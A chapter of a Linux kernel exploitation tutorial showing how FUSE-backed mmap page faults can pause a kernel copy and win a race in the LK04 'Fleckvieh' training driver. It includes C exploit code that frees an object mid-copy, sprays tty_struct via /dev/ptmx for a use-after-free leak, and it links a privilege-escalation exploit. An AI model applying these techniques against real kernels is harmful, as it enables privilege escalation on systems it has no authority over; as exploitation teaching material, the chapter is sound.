---
title: Using FUSE
tags:
    - [Linux]
    - [Kernel]
    - [Race Condition]
    - [Data Race]
    - [FUSE]
lang: en
permalink: /en/linux-kernel/LK04/fuse.html
pagination: true
bk: uffd.html
---
In the [previous chapter](uffd.html), we used `userfaultfd` to stabilize the race in LK04 (Fleckvieh). In this chapter, we exploit the same challenge again using a different method.

## Drawbacks of userfaultfd
As explained briefly in the previous chapter, on modern Linux unprivileged users cannot use `userfaultfd` freely. More precisely, userfaultfds created by unprivileged processes can observe page faults originating in user space, but not those originating in kernel space. Those restrictions were introduced by the following security mitigations:

- [userfaultfd: allow to forbid unprivileged users](https://lwn.net/Articles/782745/)
- [Control over userfaultfd kernel-fault handling](https://lwn.net/Articles/835373/)

So this time we will instead use a Linux feature called **FUSE**. First, let's understand what FUSE is.

## What is FUSE?
[**FUSE** (Filesystem in Userspace)](https://lwn.net/Articles/68104/) is a Linux feature that lets user space implement a virtual filesystem. It becomes available when the kernel is built with `CONFIG_FUSE_FS`.
The basic idea is that a program mounts a FUSE filesystem. When someone accesses a file inside that filesystem, handlers defined by the program are invoked. In structure, this is very similar to the character-device implementation we saw in LK01.[^1]

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_suyasuya.png" alt="Wolf" ></div>
  <p class="says">
    Applications that use FUSE include <a href="https://github.com/libfuse/sshfs" target="_blank">sshfs</a> and <a href="https://appimage.org/" target="_blank">AppImage</a>.
  </p>
</div>

## Using FUSE
You can check the FUSE version installed on the system with the `fusermount` command.
```
/ $ fusermount -V
fusermount version: 2.9.9
```
If you want to experiment with FUSE on your local machine, install it with the following command. The target environment uses FUSE version 2, so use `fuse`, not `fuse3`.
```
# apt-get install fuse
```
You also need the headers in order to compile FUSE programs:
```
# apt-get install libfuse-dev
```

Now let's actually use FUSE.
When a file inside a FUSE filesystem is accessed, the handlers defined in `fuse_operations` are called. `fuse_operations` can override file operations such as `open`, `read`, `write`, and `close`, directory operations such as `readdir` and `mkdir`, and even things such as `chmod`, `ioctl`, or `poll`. Here we only need `open` and `read` for exploit purposes. To make a file openable, we also need a `getattr` callback that returns metadata such as file permissions. Let's look at actual code:
```c
#define FUSE_USE_VERSION 29
#include <errno.h>
#include <fuse.h>
#include <stdio.h>
#include <string.h>

static const char *content = "Hello, World!\n";

static int getattr_callback(const char *path, struct stat *stbuf) {
  puts("[+] getattr_callback");
  memset(stbuf, 0, sizeof(struct stat));

  /* check whether the path from the mount point is "/file" */
  if (strcmp(path, "/file") == 0) {
    stbuf->st_mode = S_IFREG | 0777; // permissions
    stbuf->st_nlink = 1; // number of hard links
    stbuf->st_size = strlen(content); // file size
    return 0;
  }

  return -ENOENT;
}

static int open_callback(const char *path, struct fuse_file_info *fi) {
  puts("[+] open_callback");
  return 0;
}

static int read_callback(const char *path,
                         char *buf, size_t size, off_t offset,
                         struct fuse_file_info *fi) {
  puts("[+] read_callback");

  if (strcmp(path, "/file") == 0) {
    size_t len = strlen(content);
    if (offset >= len) return 0;

    /* return data */
    if ((size > len) || (offset + size > len)) {
      memcpy(buf, content + offset, len - offset);
      return len - offset;
    } else {
      memcpy(buf, content + offset, size);
      return size;
    }
  }

  return -ENOENT;
}

static struct fuse_operations fops = {
  .getattr = getattr_callback,
  .open = open_callback,
  .read = read_callback,
};

int main(int argc, char *argv[]) {
  return fuse_main(argc, argv, &fops, NULL);
}
```
Compile it with `-D_FILE_OFFSET_BITS=64`:
```
$ gcc test.c -o test -D_FILE_OFFSET_BITS=64 -lfuse
```
In the distributed environment, the binary must be statically linked. If you inspect the flags required by FUSE, you will see that `pthread` is also needed:
```
$ pkg-config fuse --cflags --libs
-D_FILE_OFFSET_BITS=64 -I/usr/include/fuse -lfuse -pthread
```
Even with those options, static linking still complains about `dl` symbols:
```
/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/libfuse.a(fuse.o): in function `fuse_put_module.isra.0':
(.text+0xe0e): undefined reference to `dlclose'
/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/libfuse.a(fuse.o): in function `fuse_new_common':
(.text+0x9e9e): undefined reference to `dlopen'
/usr/bin/ld: (.text+0x9efb): undefined reference to `dlsym'
/usr/bin/ld: (.text+0xa1e2): undefined reference to `dlerror'
/usr/bin/ld: (.text+0xa265): undefined reference to `dlclose'
/usr/bin/ld: (.text+0xa282): undefined reference to `dlerror'
collect2: error: ld returned 1 exit status
make: *** [Makefile:2: all] Error 1
```
If you add `-ldl` at the very end and respect the link order, a GCC-built program using FUSE works inside the target environment as well:
```
$ gcc test.c -o test -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
```

`fuse_main` parses the arguments and runs the main loop. Here we mount it on `/tmp/test`:
```
$ mkdir /tmp/test
$ ./test -f /tmp/test
```
If everything works, the program simply blocks without error. If it fails, check whether the OS supports FUSE and whether the FUSE version used at compile time matches the environment.
From another terminal, accessing `/tmp/test/file` should then read the data:
```
$ cat /tmp/test/file
Hello, World!
```
Since we did not implement `readdir`, commands such as `ls` cannot enumerate the mount point contents. Also, because we did not implement `getattr` for the root directory itself, even the existence of `/tmp/test` looks odd from the outside.

Also note that `fuse_main` is only a helper. If you do not want to pass command-line arguments every time, you can call the lower-level APIs directly:
```c
int main()
{
  struct fuse_args args = FUSE_ARGS_INIT(0, NULL);
  struct fuse_chan *chan;
  struct fuse *fuse;

  if (!(chan = fuse_mount("/tmp/test", &args)))
    fatal("fuse_mount");

  if (!(fuse = fuse_new(chan, &args, &fops, sizeof(fops), NULL))) {
    fuse_unmount("/tmp/test", chan);
    fatal("fuse_new");
  }

  fuse_set_signal_handlers(fuse_get_session(fuse));
  setup_done = 1;
  fuse_loop_mt(fuse);

  fuse_unmount("/tmp/test", chan);

  return 0;
}
```
`fuse_mount` chooses the mount point, `fuse_new` creates the FUSE instance, and `fuse_loop_mt` (`mt` for multithreaded) processes events. Do not forget `fuse_set_signal_handlers`; otherwise, the loop cannot exit cleanly and the mount point can be left broken. If execution never reaches the final `fuse_unmount`, the mount point is not cleaned up correctly.

## Stabilizing the race
Now let's think about using FUSE to stabilize the exploit.
The idea is exactly the same as with `userfaultfd`. With `userfaultfd`, the page fault itself invoked a user-side handler. With FUSE, the trigger is a file read.
If we `mmap` a file implemented through FUSE without `MAP_POPULATE`, then the first read or write to that memory causes a page fault, which ultimately leads to the FUSE `read` callback being invoked. This means we can switch context at exactly the moment when a memory access happens, just like with `userfaultfd`.

The flow looks like this:

<center>
  <img src="img/fuse_uafr.png" alt="Use-after-Free with FUSE" style="width:720px;">
</center>

The only difference from the `userfaultfd` approach is that the page fault causes a FUSE handler to run instead of a `userfaultfd` handler. Let's use that to stabilize the race.
```c
cpu_set_t pwn_cpu;
char *buf;
int victim;

...

static int read_callback(const char *path,
                         char *buf, size_t size, off_t offset,
                         struct fuse_file_info *fi) {
  static int fault_cnt = 0;
  printf("[+] read_callback\n");
  printf("    path  : %s\n", path);
  printf("    size  : 0x%lx\n", size);
  printf("    offset: 0x%lx\n", offset);

  if (strcmp(path, "/pwn") == 0) {
    switch (fault_cnt++) {
      case 0:
        puts("[+] UAF read");
        /* [1-2] page fault during `blob_get` */
        // free victim
        del(victim);

        // spray tty_struct so it overlaps victim
        int fds[0x10];
        for (int i = 0; i < 0x10; i++) {
          fds[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
          if (fds[i] == -1) fatal("/dev/ptmx");
        }
        return size;
    }
  }

  return -ENOENT;
}

...

int setup_done = 0;

void *fuse_thread(void *_arg) {
  struct fuse_args args = FUSE_ARGS_INIT(0, NULL);
  struct fuse_chan *chan;
  struct fuse *fuse;

  if (mkdir("/tmp/test", 0777))
    fatal("mkdir(\"/tmp/test\")");

  if (!(chan = fuse_mount("/tmp/test", &args)))
    fatal("fuse_mount");

  if (!(fuse = fuse_new(chan, &args, &fops, sizeof(fops), NULL))) {
    fuse_unmount("/tmp/test", chan);
    fatal("fuse_new");
  }

  /* run the main thread on the same CPU */
  if (sched_setaffinity(0, sizeof(cpu_set_t), &pwn_cpu))
    fatal("sched_setaffinity");

  fuse_set_signal_handlers(fuse_get_session(fuse));
  setup_done = 1;
  fuse_loop_mt(fuse);

  fuse_unmount("/tmp/test", chan);
  return NULL;
}

int main(int argc, char **argv) {
  /* make sure the main and FUSE threads always run on the same CPU */
  CPU_ZERO(&pwn_cpu);
  CPU_SET(0, &pwn_cpu);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &pwn_cpu))
    fatal("sched_setaffinity");

  pthread_t th;
  pthread_create(&th, NULL, fuse_thread, NULL);
  while (!setup_done);

  /*
   * Main exploit body
   */
  fd = open("/dev/fleckvieh", O_RDWR);
  if (fd == -1) fatal("/dev/fleckvieh");

  /* map a FUSE file into memory */
  int pwn_fd = open("/tmp/test/pwn", O_RDWR);
  if (pwn_fd == -1) fatal("/tmp/test/pwn");
  void *page;
  page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
              MAP_PRIVATE, pwn_fd, 0);
  if (page == MAP_FAILED) fatal("mmap");

  /* prepare data with the same size as tty_struct */
  buf = (char*)malloc(0x400);
  victim = add(buf, 0x400);
  set(victim, "Hello", 6);

  /* [1-1] UAF Read: leak tty_struct */
  get(victim, page, 0x400);
  for (int i = 0; i < 0x80; i += 8) {
    printf("%02x: 0x%016lx\n", i, *(unsigned long*)(page + i));
  }

  return 0;
}
```
Compared to the previous chapter, the structure is very similar. In that sense, FUSE can sometimes be used as a substitute for `userfaultfd`. If you run the code, you will see that part of a `tty_struct` is leaked.

<center>
  <img src="img/fuse_uaf_read.png" alt="UAF Read" style="width:280px;">
</center>

As with `userfaultfd`, the leak misses the beginning of the object because `copy_to_user` is called with a large size. As before, that can be solved by leaking with a smaller copy size.

One detail that differs from `userfaultfd` is that FUSE requests exactly the size mapped for the file in the first fault. With `userfaultfd`, faults happen page by page, so if you want the handler to run three times, mapping 0x3000 bytes is enough.
With FUSE, however, if the first fault requests all 0x3000 bytes at once, no later page faults happen. The easy fix is to reopen the file each time.

Because we need to open the file repeatedly, it is useful to wrap that logic in a helper:
```c
int pwn_fd = -1;
void* mmap_fuse_file(void) {
  if (pwn_fd != -1) close(pwn_fd);
  pwn_fd = open("/tmp/test/pwn", O_RDWR);
  if (pwn_fd == -1) fatal("/tmp/test/pwn");

  void *page;
  page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
              MAP_PRIVATE, pwn_fd, 0);
  if (page == MAP_FAILED) fatal("mmap");
  return page;
}
```
From there, things are basically the same as in the `userfaultfd` version. The operation that previously filled `copy.src` in the `userfaultfd` exploit can be reproduced in FUSE simply by copying the desired bytes into the user buffer with `memcpy`.
Try completing the exploit yourself.

<center>
  <img src="img/fuse_privesc.png" alt="Privilege escalation with FUSE" style="width:280px;">
</center>

The sample exploit code can be downloaded [here](exploit/fleckvieh_fuse.c).

[^1]: There is also a mechanism called CUSE for registering a virtual character device from user space.
